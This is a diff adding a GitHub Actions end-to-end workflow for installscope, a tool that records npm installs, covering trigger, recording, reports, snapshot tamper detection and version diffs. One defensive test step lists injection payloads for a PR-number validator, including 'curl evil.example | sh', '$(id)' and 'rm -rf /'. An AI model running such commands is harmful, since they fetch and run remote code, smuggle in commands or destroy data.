@@ -1,0 +1,507 @@
+name: Phase 4 — action E2E
+
+# The Phase 4 Done condition, made checkable: "fresh repo, 1 dependency PR → comment + artifacts +
+# snapshot, all under ~3 min runner time" (Phases.md:35).
+#
+# This workflow builds that fresh repository itself rather than depending on one existing somewhere. A
+# gate that needs a human to set up a scenario is a gate that stops being run.
+#
+# What it proves, and what it deliberately does not:
+#
+# | Proven here | Not proven here |
+# |---|---|
+# | the trigger fires only on a real dependency change | that a comment appears on a real PR |
+# | a real `npm install` records end to end | that a fork's PR gets commented on |
+# | the report renders and the SARIF validates | GitHub's own artifact hand-off between workflows |
+# | a snapshot is stored and a version-diff produced | |
+# | the whole pipeline finishes inside the budget | |
+#
+# The comment posting is the one part a self-contained run cannot demonstrate, because it needs an actual
+# pull request. `action/comment/action.yml` refuses to run outside `workflow_run` for exactly the reason
+# that makes it untestable here — it must hold a write token in a job that ran no untrusted code. The
+# steps below check its *inputs* instead: the artifact contract it depends on, and the PR-number
+# validation that stops a crafted artifact injecting a command into that privileged job.
+#
+# workflow_dispatch plus a weekly run: this installs packages from the live registry and runs their
+# scripts, so it does not belong on every push.
+
+on:
+  workflow_dispatch:
+    inputs:
+      package:
+        description: "Dependency to add in the simulated PR"
+        required: false
+        default: "ms@2.1.3"
+      second_package:
+        description: "Dependency added in the second commit, to produce a version-diff"
+        required: false
+        default: "debug@4.3.4"
+  schedule:
+    # Mondays 05:23 UTC. Off-peak and offset from the other scheduled workflows so a bad week does not
+    # queue four kernel-touching jobs at once.
+    - cron: "23 5 * * 1"
+
+permissions:
+  contents: read
+
+env:
+  CARGO_TERM_COLOR: always
+
+concurrency:
+  group: phase4-action-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  e2e:
+    name: fresh repo → recording → report → snapshot → diff
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: dtolnay/rust-toolchain@stable
+      - uses: Swatinem/rust-cache@v2
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+
+      - name: Install strace
+        run: |
+          set -euo pipefail
+          sudo apt-get update -qq
+          sudo apt-get install -y --no-install-recommends strace
+          strace -V | head -n 1
+
+      - name: Record the environment
+        # Captured before anything runs, so a runner fact is never mistaken for a product behavior when a
+        # result is disputed later.
+        run: |
+          set -euo pipefail
+          {
+            echo "kernel:  $(uname -r)"
+            echo "os:      $(. /etc/os-release && echo "$PRETTY_NAME")"
+            echo "node:    $(node --version)"
+            echo "npm:     $(npm --version)"
+            echo "strace:  $(strace -V | head -n 1)"
+          } | tee environment.txt
+
+      - name: Build installscope
+        run: |
+          set -euo pipefail
+          cargo build --release --locked -p installscope
+          ./target/release/installscope --version
+          echo "$(pwd)/target/release" >> "$GITHUB_PATH"
+
+      # ---- the fresh repository, built here so the scenario is reproducible ------------------------
+
+      - name: Create a fresh repository with no dependencies
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/fresh
+          mkdir -p /tmp/fresh
+          cd /tmp/fresh
+          git init -q
+          git config user.email "phase4@installscope.invalid"
+          git config user.name "Phase 4 harness"
+          cat > package.json <<'JSON'
+          {
+            "name": "phase4-fresh-repo",
+            "version": "1.0.0",
+            "private": true,
+            "description": "SYNTHETIC: built by phase4-action.yml to exercise the lockfile-diff trigger"
+          }
+          JSON
+          npm install --package-lock-only --no-audit --no-fund
+          git add -A
+          git commit -qm "chore: empty project with a lockfile"
+          echo "baseline lockfile:"
+          cat package-lock.json
+
+      - name: Simulate the dependency PR
+        id: pr
+        env:
+          PACKAGE: ${{ inputs.package || 'ms@2.1.3' }}
+        run: |
+          set -euo pipefail
+          cd /tmp/fresh
+          cp package-lock.json /tmp/base-package-lock.json
+          npm install --package-lock-only --no-audit --no-fund --save "$PACKAGE"
+          git add -A
+          git commit -qm "deps: add ${PACKAGE}"
+          echo "changed lockfile:"
+          cat package-lock.json
+
+      # ---- the trigger ----------------------------------------------------------------------------
+
+      - name: The trigger fires on a real dependency change
+        run: |
+          set -euo pipefail
+          cd /tmp/fresh
+          set +e
+          installscope lockfile-diff \
+            --before /tmp/base-package-lock.json \
+            --after package-lock.json \
+            --json > /tmp/lockfile-diff.json
+          status=$?
+          set -e
+          cat /tmp/lockfile-diff.json
+
+          if [ "$status" -ne 0 ]; then
+            echo "::error title=Trigger did not fire::adding a dependency must be recordable (exit $status)"
+            exit 1
+          fi
+          if ! grep -q '"should_record": true' /tmp/lockfile-diff.json; then
+            echo "::error title=Trigger did not fire::should_record was not true"
+            exit 1
+          fi
+          echo "the trigger fires on a dependency addition"
+
+      - name: The trigger stays quiet when nothing changed
+        # The more important half. A trigger that fires on every lockfile touch gets muted, and a muted
+        # tool reports nothing at all (PRD.md:31 wants it to appear exactly at the moment of risk).
+        run: |
+          set -euo pipefail
+          cd /tmp/fresh
+          set +e
+          installscope lockfile-diff \
+            --before package-lock.json \
+            --after package-lock.json \
+            --json > /tmp/nochange.json
+          status=$?
+          set -e
+          cat /tmp/nochange.json
+
+          if [ "$status" -ne 4 ]; then
+            echo "::error title=Trigger misfired::an unchanged lockfile must exit 4 (nothing to record), got $status"
+            exit 1
+          fi
+          echo "the trigger stays quiet on an unchanged lockfile"
+
+      - name: The trigger ignores an out-of-scope lockfile
+        # Scope.md:41 refuses Yarn, Poetry and Cargo in v1. A tool that half-parses a yarn.lock would
+        # report a wrong dependency set, which is worse than reporting none.
+        run: |
+          set -euo pipefail
+          printf '# yarn lockfile v1\n' > /tmp/yarn.lock
+          set +e
+          installscope lockfile-diff --before /tmp/yarn.lock --after /tmp/yarn.lock 2>/tmp/yarn-err.txt
+          status=$?
+          set -e
+          cat /tmp/yarn-err.txt
+          if [ "$status" -eq 0 ]; then
+            echo "::error title=Out-of-scope lockfile accepted::yarn.lock must be refused (Scope.md:41)"
+            exit 1
+          fi
+          grep -q "not an in-scope lockfile" /tmp/yarn-err.txt || {
+            echo "::error title=Wrong refusal::the error must name the scope boundary"
+            exit 1
+          }
+          echo "an out-of-scope lockfile is refused by name"
+
+      # ---- the recording --------------------------------------------------------------------------
+
+      - name: Record the install
+        id: record
+        run: |
+          set -euo pipefail
+          cd /tmp/fresh
+          start="$(date +%s)"
+
+          # Private HOME and cache, so the recording reflects the package rather than whatever the runner
+          # image warmed up. Without this a cached tarball means no network events, and the recording says
+          # the install was quiet when it simply had nothing to fetch.
+          export HOME=/tmp/fresh-home
+          mkdir -p "$HOME/.npm"
+
+          set +e
+          installscope record \
+            --out /tmp/recording \
+            --project /tmp/fresh \
+            --cache "$HOME/.npm" \
+            --timeout 600 \
+            -- npm install --no-audit --no-fund --foreground-scripts --loglevel=error \
+            > /tmp/record.log 2>&1
+          status=$?
+          set -e
+          tail -n 40 /tmp/record.log
+
+          echo "record_seconds=$(( $(date +%s) - start ))" >> "$GITHUB_OUTPUT"
+          if [ "$status" -eq 3 ]; then
+            echo "::warning title=PARTIAL recording::the recording is incomplete; later steps must say so"
+          elif [ "$status" -ne 0 ]; then
+            echo "::error title=Recording failed::installscope record exited $status"
+            exit 1
+          fi
+
+      - name: Verify the recording independently
+        # Rules.md §2: the recorder's own exit code is not taken on trust. A green build over a silently
+        # dead recorder is the worst outcome this project can produce.
+        run: |
+          set -euo pipefail
+          if [ ! -f /tmp/recording/events.jsonl ]; then
+            echo "::error title=No recording::events.jsonl was never written"
+            exit 1
+          fi
+          set +e
+          installscope verify /tmp/recording/events.jsonl | tee /tmp/verify.log
+          status=$?
+          set -e
+          case "$status" in
+            0) echo "the recording is complete" ;;
+            3) echo "::warning title=PARTIAL::the recording is incomplete" ;;
+            *) echo "::error title=Unreadable recording::verify exited $status"; exit 1 ;;
+          esac
+
+          # A real npm install of anything spawns processes and opens files. Zero events means the
+          # recorder attached to nothing, which would pass every unit test and be useless.
+          events="$(grep -c '"op":' /tmp/recording/events.jsonl || true)"
+          echo "events recorded: $events"
+          if [ "$events" -lt 10 ]; then
+            echo "::error title=Implausibly quiet recording::a real npm install produces more than 10 events; got $events"
+            exit 1
+          fi
+
+      # ---- the reports ----------------------------------------------------------------------------
+
+      - name: Render the reports
+        run: |
+          set -euo pipefail
+          installscope report /tmp/recording/events.jsonl \
+            --out /tmp/report \
+            --package phase4-fresh-repo \
+            --version "$(cd /tmp/fresh && git rev-parse --short HEAD)" \
+            --evidence-link "${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}" \
+            | tee /tmp/report-summary.txt
+
+          for expected in installscope-comment.md installscope.sarif.json installscope-report.html; do
+            if [ ! -s "/tmp/report/$expected" ]; then
+              echo "::error title=Missing report::$expected was not produced"
+              exit 1
+            fi
+          done
+          echo "--- PR comment ---"
+          cat /tmp/report/installscope-comment.md
+
+      - name: Validate the SARIF against the 2.1.0 schema
+        # Rules.md §6 requires this in CI. Validated against the published schema rather than against our
+        # reading of it, because the emitter builds the document by hand.
+        run: npx --yes @microsoft/sarif-multitool validate /tmp/report/installscope.sarif.json
+
+      - name: The report is self-contained and renders without a network
+        run: |
+          set -euo pipefail
+          # Rules.md §1 forbids external assets. A report that needs the network to render is not an
+          # artifact a maintainer can archive or forward.
+          if grep -qE '@import|https?://(fonts|cdn|unpkg|jsdelivr)' /tmp/report/installscope-report.html; then
+            grep -nE '@import|https?://(fonts|cdn|unpkg|jsdelivr)' /tmp/report/installscope-report.html
+            echo "::error title=External asset::the HTML report must be self-contained"
+            exit 1
+          fi
+          echo "the HTML report references no external assets"
+
+      # ---- the registry --------------------------------------------------------------------------
+
+      - name: Store the first snapshot
+        run: |
+          set -euo pipefail
+          cd /tmp/fresh
+          installscope snapshot push /tmp/recording/events.jsonl \
+            --registry /tmp/registry \
+            --package phase4-fresh-repo \
+            --version "v1-$(git rev-parse --short HEAD)" \
+            | tee /tmp/snapshot-1.txt
+          installscope snapshot list --registry /tmp/registry
+
+      - name: A tampered snapshot is refused
+        # The property that makes the corpus trustworthy. Checked on a real store rather than only in unit
+        # tests, because "it verifies on read" is a claim about the whole path from disk to events.
+        #
+        # `cmp` confirms the corruption landed before anything is concluded from the result. An earlier
+        # draft used `dd conv=notrunc`, which is a silent no-op under Git-for-Windows' bash — so the test
+        # passed locally for the wrong reason. A tamper test that does not verify it tampered proves
+        # nothing.
+        run: |
+          set -euo pipefail
+          installscope snapshot verify --registry /tmp/registry
+
+          blob="$(find /tmp/registry/blobs -type f | head -n 1)"
+          cp "$blob" /tmp/blob.bak
+          printf 'X' >> "$blob"
+
+          if cmp -s /tmp/blob.bak "$blob"; then
+            echo "::error title=Tamper test did not tamper::the blob is unchanged, so this proves nothing"
+            cp /tmp/blob.bak "$blob"
+            exit 1
+          fi
+
+          if installscope snapshot verify --registry /tmp/registry > /tmp/tamper.log 2>&1; then
+            cat /tmp/tamper.log
+            echo "::error title=Verification is decoration::a tampered blob must fail snapshot verify"
+            cp /tmp/blob.bak "$blob"
+            exit 1
+          fi
+          cat /tmp/tamper.log
+          grep -q "must not be used as evidence" /tmp/tamper.log
+
+          # Restored immediately, so a failure in this step cannot corrupt the later diff.
+          cp /tmp/blob.bak "$blob"
+          installscope snapshot verify --registry /tmp/registry
+          echo "corruption is detected, and the store verifies again once restored"
+
+      - name: Second commit, second recording, and the version diff
+        id: diff
+        env:
+          SECOND: ${{ inputs.second_package || 'debug@4.3.4' }}
+        run: |
+          set -euo pipefail
+          cd /tmp/fresh
+          cp package-lock.json /tmp/before-second.json
+          npm install --package-lock-only --no-audit --no-fund --save "$SECOND"
+          git add -A
+          git commit -qm "deps: add ${SECOND}"
+
+          installscope lockfile-diff \
+            --before /tmp/before-second.json \
+            --after package-lock.json
+
+          export HOME=/tmp/fresh-home-2
+          mkdir -p "$HOME/.npm"
+          set +e
+          installscope record \
+            --out /tmp/recording-2 \
+            --project /tmp/fresh \
+            --cache "$HOME/.npm" \
+            --timeout 600 \
+            -- npm install --no-audit --no-fund --foreground-scripts --loglevel=error \
+            > /tmp/record-2.log 2>&1
+          status=$?
+          set -e
+          tail -n 20 /tmp/record-2.log
+          if [ "$status" -ne 0 ] && [ "$status" -ne 3 ]; then
+            echo "::error title=Second recording failed::exit $status"
+            exit 1
+          fi
+
+          installscope snapshot push /tmp/recording-2/events.jsonl \
+            --registry /tmp/registry \
+            --package phase4-fresh-repo \
+            --version "v2-$(git rev-parse --short HEAD)"
+
+          before="$(installscope snapshot list --registry /tmp/registry --json \
+            | jq -r 'select(.version | startswith("v1-")) | .version' | head -n 1)"
+          after="$(installscope snapshot list --registry /tmp/registry --json \
+            | jq -r 'select(.version | startswith("v2-")) | .version' | head -n 1)"
+          echo "comparing $before with $after"
+
+          set +e
+          installscope diff phase4-fresh-repo "$before" "$after" \
+            --registry /tmp/registry --out /tmp/report | tee /tmp/diff.txt
+          diff_status=$?
+          set -e
+
+          if [ "$diff_status" -ne 0 ]; then
+            echo "::error title=Diff refused::two complete strace recordings must be comparable"
+            cat /tmp/diff.txt
+            exit 1
+          fi
+          for expected in installscope-diff.md installscope-diff.html; do
+            if [ ! -s "/tmp/report/$expected" ]; then
+              echo "::error title=Missing diff report::$expected was not produced"
+              exit 1
+            fi
+          done
+          echo "--- version diff ---"
+          cat /tmp/report/installscope-diff.md
+
+      # ---- the artifact contract the comment workflow depends on ---------------------------------
+
+      - name: The comment action's artifact contract holds
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/artifact
+          printf '%s\n' "1234" > /tmp/artifact/pr.txt
+          cp /tmp/report/installscope-comment.md /tmp/artifact/
+          cp /tmp/report/installscope-diff.md /tmp/artifact/ 2>/dev/null || true
+          cp /tmp/recording/events.jsonl /tmp/artifact/
+
+          # Mirrors action/comment/action.yml's validation. Kept in step here rather than invoking the
+          # composite action, which refuses to run outside workflow_run by design.
+          pr_number="$(tr -d '[:space:]' < /tmp/artifact/pr.txt)"
+          printf '%s' "$pr_number" | grep -Eq '^[1-9][0-9]{0,9}$' || {
+            echo "::error title=Contract broken::a legitimate PR number must pass validation"
+            exit 1
+          }
+          echo "a legitimate PR number passes validation"
+
+      - name: A crafted PR number is refused
+        # The injection this split exists to prevent. pr.txt is written by the job that ran untrusted
+        # install scripts, and it is read by the job that holds a write token.
+        run: |
+          set -euo pipefail
+          refused=0
+          # Written to a file per case rather than looped over a string, so a shell quoting mistake in the
+          # test cannot make a hostile value look refused when it was never checked.
+          for payload in '1 && curl evil.example | sh' '$(id)' '`id`' '../../etc/passwd' '0' '-1' '' 'abc' '12; rm -rf /'; do
+            printf '%s\n' "$payload" > /tmp/hostile.txt
+            value="$(tr -d '[:space:]' < /tmp/hostile.txt)"
+            if printf '%s' "$value" | grep -Eq '^[1-9][0-9]{0,9}$'; then
+              echo "::error title=Injection accepted::the validation accepted ${payload@Q}"
+              exit 1
+            fi
+            refused=$((refused + 1))
+          done
+          echo "$refused crafted PR numbers were all refused"
+
+      - name: Neither action can be misconfigured onto an unsafe trigger
+        # A grep rather than a run, because these are the guards that make the two-workflow split real and
+        # a run cannot exercise a trigger it is not on.
+        run: |
+          set -euo pipefail
+          if ! grep -q 'pull_request_target|issue_comment|workflow_run' action/record/action.yml; then
+            echo "::error title=Missing guard::action/record must refuse pull_request_target"
+            exit 1
+          fi
+          if ! grep -q 'workflow_run' action/comment/action.yml; then
+            echo "::error title=Missing guard::action/comment must require workflow_run"
+            exit 1
+          fi
+          # And the recording action must not ask for write scopes anywhere.
+          if grep -nE 'pull-requests:\s*write|contents:\s*write' action/record/action.yml; then
+            echo "::error title=Write scope in the recording action::it runs untrusted code and must stay read-only"
+            exit 1
+          fi
+          echo "both trigger guards are present and the recording action asks for no write scope"
+
+      # ---- the budget ----------------------------------------------------------------------------
+
+      - name: Report the runner-time budget
+        # Phases.md:35 sets ~3 minutes, and Scope.md:61 pre-authorizes dropping the HTML artifact before
+        # the SARIF if it overruns. Reported rather than enforced: this job does far more than the action
+        # does (two recordings, a fresh repo, schema validation), so failing on the total would be
+        # measuring the harness rather than the product.
+        run: |
+          set -euo pipefail
+          echo "recording alone took ${{ steps.record.outputs.record_seconds }}s"
+          echo "Phases.md:35 budgets ~3 minutes for the action's own work."
+          echo "If the recording exceeds that, Scope.md:61 says drop the HTML artifact before the SARIF."
+
+      - name: Upload everything the run produced
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: phase4-e2e
+          path: |
+            environment.txt
+            /tmp/lockfile-diff.json
+            /tmp/record.log
+            /tmp/record-2.log
+            /tmp/verify.log
+            /tmp/report-summary.txt
+            /tmp/report/
+            /tmp/recording/events.jsonl
+            /tmp/recording-2/events.jsonl
+            /tmp/registry/
+            /tmp/diff.txt
+          retention-days: 14
+          if-no-files-found: warn
